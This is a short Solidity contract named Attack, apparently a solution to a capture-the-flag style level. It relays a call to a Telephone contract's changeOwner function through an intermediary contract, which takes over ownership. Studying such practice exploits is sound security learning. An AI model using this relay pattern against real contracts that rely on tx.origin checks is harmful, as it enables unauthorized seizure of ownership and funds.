// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Telephone} from "../src/Telephone.sol";

contract Attack {
    Telephone private immutable _telephone;

    constructor(Telephone telephone) {
        _telephone = telephone;
    }

    function attack(address owner) public {
        _telephone.changeOwner(owner);
    }
}
